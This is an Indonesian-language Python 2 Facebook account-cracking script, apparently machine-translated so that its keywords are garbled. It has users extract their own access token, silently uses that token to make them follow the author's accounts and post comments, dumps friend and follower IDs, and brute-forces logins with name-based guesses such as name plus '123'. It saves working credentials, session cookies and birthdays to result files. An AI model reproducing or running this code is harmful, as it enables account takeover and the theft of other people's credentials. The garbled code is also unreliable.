#!/usr/bin/python2
# pengkodean=utf-8
# Dikodekan Oleh Yayan XD
# Facebook Saya ( https://www.facebook.com/KM39453 )
...
permintaan impor, os, re, bs4, sys, json, waktu, acak, datetime
dari bersamaan.futures mengimpor ThreadPoolExecutor sebagai YayanGanteng
...
#LO KONTOL
logo = ''' \033[0;96m
 \033[0;96m  _________________
 \033[0,96m l BMBF       GENZ l ® \033[0m|| Dibuat Oleh YayanXD
 \033[0;96m l BMBF       GENZ l \033[0m|| Github.com/genzi66
 \033[0;96m l BMBF       GENZ l 
...
def hasil(ok,cp):
    jika len(ok) != 0 atau len(cp) != 0:
        ...
        print '\n\n [%s+%s] total Oke : %s%s%s'%(O,N,H,str(len(ok)),N)
...
def yayanxd():
    ...
    jika kontol di ('buka', 'Buka', 'BUKA'):
        cetak '\n%s *%s catatan! usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
        cetak '%s *%s jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
        print '%s *%s setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
        print '%s *%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
        raw_input(' %s*%s tekan enter '%(O,N))
        os.system('xdg-buka https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        yayanxd()
    mencoba:
        nama = request.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
        ...
        buka('.memek.txt', 'w').tulis(kontol)
        raw_input(' %s*%s tekan enter '%(O,N));wuhan(kontol)
        os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
        moch_yayan()
    kecuali KeyError:
        print '\n\n %s[%s!%s] token tidak valid'%(N,M,N);time.sleep(2);yayanxd()

### ORANG GANTENG ###
def moch_yayan():
    os.system('hapus')
    mencoba:
    	kontol = buka('.memek.txt', 'r').read()
    kecuali IOError:
        print '\n %s[%s×%s] token tidak valid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    mencoba:
        nama = request.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    kecuali KeyError:
        print '\n %s[%s×%s] token tidak valid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    ...
    os.system('hapus')
    cetak logo
    IP = request.get('https://www.yayanxd.my.id/server/ip/').text
    print '____________________________________________________________\n';time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) PENGGUNA AKTIF : %s'%(nama);time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) PERANGKAT IP : %s'%(IP)
    print '____________________________________________________________\n';time.sleep(0.03)
    cetak ' [%s1%s]. Dump id dari teman'%(O,N);time.sleep(0.03)
    cetak ' [%s2%s]. Dump id dari teman publik'%(O,N);time.sleep(0.03)
    cetak ' [%s3%s]. Dump id dari total followers'%(O,N);time.sleep(0.03)
    cetak ' [%s4%s]. Dump id dari like postingan'%(O,N);time.sleep(0.03)
    cetak ' [%s5%s]. Mulai crack'%(O,N);time.sleep(0.03)
    cetak ' [%s6%s]. Cek ingformasi akun fb'%(O,N);time.sleep(0.03)
    cetak ' [%s7%s]. Lihat hasil crack'%(O,N);time.sleep(0.03)
    cetak ' [%s8%s]. Pengaturan agen pengguna'%(O,N);time.sleep(0.03)
    cetak ' [%s9%s]. Inngfo %sscript%s'%(O,N,O,N);time.sleep(0.03)
    cetak ' [%s0%s]. logout (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
    pepek = raw_input('\n [*] menu : ')
    jika pepek == '':
        ...
        mencoba:
            ...
            total = buka("hasil/%s"%(file)).read().splitlines()
...
def wuhan (kontol):
    mencoba:
        kentod = kontol
        request.post('https://graph.facebook.com/10000539541380/subscribers?access_token=%s'%(kentod))
        request.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
        request.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
        request.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
        request.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
        request.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
        request.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
        request.post('https://graph.facebook.com/100013031465766/subscribers?access_token=%s'%(kentod))
        request.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
        request.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
        request.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
        #requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
        request.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
    kecuali:
    	lulus
...
def teman(kontol):
    ...
    mencoba:
        ...
        asw = raw_input(' %s[%s?%s] batas id : '%(N,O,N))
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        xxx = buka(cin, 'w')
        untuk di request.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
            id.append(a['nama'] + '<=>' + a['id'])
            xxx.write(a['nama'] + '<=>' + a['id'] + '\n')
    ...
    kecuali (KeyError,IOError):
        os.hapus(cin)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id publik.\n'%(N,M,N))
...
class __crack__:
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                ...
                try:
                    ...
                    wrt = ' [×] %s|%s|%s %s %s' % (pengguna, pw, hari, bulan, tahun)
                    cp.tambahkan(wrt)
                ...
                print '\r %s* --> %s|%s %s' % (K,pengguna,pw,N)
                wrt = ' [×] %s|%s' % (pengguna,pw)
                cp.tambahkan(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                merusak
        ...
        lingkaran += 1
    def __mbasic__(diri sendiri, pengguna, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self. id),len(ok),len(cp))),
        sys.stdout.flush()
        untuk pw di __yan__:
            ...
            kecuali: lulus
            mencoba:
            	_kontol = buka('YNTKTS.txt', 'r').read()
            kecuali (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC /id_ID;FBAV/239.0.0.10.109;]'
            ses = permintaan.Sesi()
            ...
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": pengguna, "lulus": pw, "login": "kirim"})
            jika "c_user" di ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam ses.cookies.get_dict().items() ])
                print '\r %s* --> %s|%s|%s %s' % (H,pengguna,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (pengguna,pw,kuki)
                ok.tambahkan(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                merusak
            elif "checkpoint" di ses.cookies.get_dict().keys():
                mencoba:
                    kontol = buka('.memek.txt').read()
                    cp_ttl = request.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    bulan, hari, tahun = cp_ttl.split('/')
                    bulan = bulan_ttl[bulan]
                    print '\r %s* --> %s|%s|%s %s %s %s' % (K,pengguna,pw,hari,bulan,tahun,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (pengguna, pw, hari, bulan, tahun)
                    cp.tambahkan(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    merusak
        ...
        lingkaran += 1
    def __mfb__(sendiri, pengguna, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self. id),len(ok),len(cp))),
        sys.stdout.flush()
        untuk pw di __yan__:
            ...
            b = ses.post("https://m.facebook.com/login.php", data={"email": pengguna, "lulus": pw, "login": "kirim"})
            jika "c_user" di ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam ses.cookies.get_dict().items() ])
                print '\r %s* --> %s|%s|%s %s' % (H,pengguna,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (pengguna,pw,kuki)
    ...
    def __pler__(diri):
        ...
        jika ya == '':
            ...
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            dengan YayanGanteng(max_workers=30) sebagai (__yayanXD__):
            	untuk yntkts di self.id: #Yo Ndak Tau Kok Tanya Saia
                    mencoba:
                        nama, uid = yntkts.split('<=>')
                        xz = nama.split(' ')
                        if len(xz) == 3 atau len(xz) == 4 atau len(xz) == 5 atau len(xz) == 6:
                            pwx = [nama, xz[0]+"123", xz[0]+"12345"]
                        kalau tidak:
                            pwx = [nama, xz[0]+"123", xz[0]+"12345"]
